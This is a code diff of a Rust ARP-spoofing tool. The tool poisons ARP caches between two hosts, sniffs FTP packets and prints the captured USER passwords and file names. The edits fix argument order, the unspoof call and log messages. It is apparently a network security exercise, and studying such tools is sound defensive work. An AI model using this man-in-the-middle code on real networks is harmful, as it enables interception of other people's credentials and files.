@@ -48,7 +48,7 @@ fn main() -> Result<()> {
     let mut client = ArpAttacker::new(iface)?;
     print!(
         "spoofing as {} ({}) to {} ({})...",
-        args.sip, args.smac, args.tip, args.smac
+        args.tip, args.tmac, args.sip, args.smac
     );
     client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
     println!(" done.");
@@ -78,7 +78,7 @@ fn main() -> Result<()> {
         _ = ftp_handle(data);
     }
     print!("unspoofing...");
-    client.unspoof((args.sip, args.smac), (args.tip, args.tmac))?;
+    client.unspoof((args.tip, args.tmac))?;
     println!(" done.");
     Ok(())
 }
@@ -103,7 +103,7 @@ pub fn ftp_handle(p: EthernetPacket) -> Result<()> {
         println!("sending {filename}");
     } else if let Some(i) = viewable_payload.find("RETR") {
         let filename = &viewable_payload[i + 5..];
-        println!("receiving {filename}");
+        println!("requesting {filename}");
     } else if let Some(i) = viewable_payload.find("USER") {
         let user = &viewable_payload[i + 5..];
         println!("logging in as {user:?}");
@@ -111,7 +111,7 @@ pub fn ftp_handle(p: EthernetPacket) -> Result<()> {
         let pass = &viewable_payload[i + 5..];
         println!("logging in with password {pass:?}");
     } else {
-        return Err(anyhow!("no STOR or RETR found"));
+        return Err(anyhow!("unrecognized ftp command"));
     }
     Ok(())
 }
